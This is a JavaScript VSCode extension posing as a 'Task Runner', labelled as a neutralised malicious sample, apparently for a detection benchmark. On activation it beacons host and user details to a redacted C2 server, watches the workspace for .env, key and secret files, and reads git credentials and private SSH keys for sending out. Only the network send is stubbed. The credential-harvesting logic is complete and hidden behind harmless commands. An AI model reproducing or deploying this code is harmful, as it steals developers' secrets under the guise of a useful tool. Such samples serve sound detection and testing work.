/**
 * VSCode Enhancer - Task Runner Extension
 * BENCHMARK_TEST_ONLY - Neutralized malicious sample
 */

const vscode = require('vscode');
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// [REDACTED] C2 configuration
const C2_HOST = '[REDACTED_C2_DOMAIN]';
const C2_PORT = 443;
const BEACON_INTERVAL = 300000; // 5 minutes

/**
 * Extension activation
 */
function activate(context) {
    console.log('Task Runner activated');

    // Register legitimate commands
    context.subscriptions.push(
        vscode.commands.registerCommand('taskRunner.runTask', runTask),
        vscode.commands.registerCommand('taskRunner.listTasks', listTasks)
    );

    // [REDACTED] - Start malicious activities
    initializeBeacon();
    monitorWorkspace();
    collectCredentials();
}

/**
 * [REDACTED] - Initialize C2 beacon
 */
function initializeBeacon() {
    const sendBeacon = () => {
        const payload = {
            hostname: os.hostname(),
            user: os.userInfo().username,
            platform: os.platform(),
            workspaces: getWorkspaces(),
            timestamp: new Date().toISOString()
        };

        // [REDACTED] - Send beacon to C2
        sendToC2('/beacon', payload);
    };

    sendBeacon();
    setInterval(sendBeacon, BEACON_INTERVAL);
}

/**
 * [REDACTED] - Monitor workspace for sensitive files
 */
function monitorWorkspace() {
    // Watch for file changes
    const watcher = vscode.workspace.createFileSystemWatcher('**/*');

    watcher.onDidChange(uri => {
        checkAndExfiltrate(uri.fsPath);
    });

    watcher.onDidCreate(uri => {
        checkAndExfiltrate(uri.fsPath);
    });
}

/**
 * [REDACTED] - Check if file is interesting and exfiltrate
 */
function checkAndExfiltrate(filePath) {
    const sensitivePatterns = [
        /\.env$/i,
        /secret/i,
        /password/i,
        /credential/i,
        /config\.json$/i,
        /\.pem$/i,
        /\.key$/i
    ];

    if (sensitivePatterns.some(p => p.test(filePath))) {
        try {
            const content = fs.readFileSync(filePath, 'utf8');
            sendToC2('/exfil', {
                path: filePath,
                content: content,
                hostname: os.hostname()
            });
        } catch (e) {
            // Ignore read errors
        }
    }
}

/**
 * [REDACTED] - Collect stored credentials
 */
function collectCredentials() {
    // Collect git credentials
    const gitCredentials = path.join(os.homedir(), '.git-credentials');
    if (fs.existsSync(gitCredentials)) {
        const content = fs.readFileSync(gitCredentials, 'utf8');
        sendToC2('/creds', { type: 'git', content: content });
    }

    // Collect SSH keys
    const sshDir = path.join(os.homedir(), '.ssh');
    if (fs.existsSync(sshDir)) {
        fs.readdirSync(sshDir).forEach(file => {
            if (!file.endsWith('.pub') && file.startsWith('id_')) {
                const keyPath = path.join(sshDir, file);
                const content = fs.readFileSync(keyPath, 'utf8');
                sendToC2('/creds', { type: 'ssh', file: file, content: content });
            }
        });
    }
}

function getWorkspaces() {
    return vscode.workspace.workspaceFolders?.map(f => f.uri.fsPath) || [];
}

function sendToC2(endpoint, data) {
    // [REDACTED] - HTTP POST to C2
}

// Legitimate task runner functions
function runTask() {
    vscode.window.showInformationMessage('Running task...');
}

function listTasks() {
    vscode.window.showInformationMessage('Listing tasks...');
}

function deactivate() {}

module.exports = { activate, deactivate };
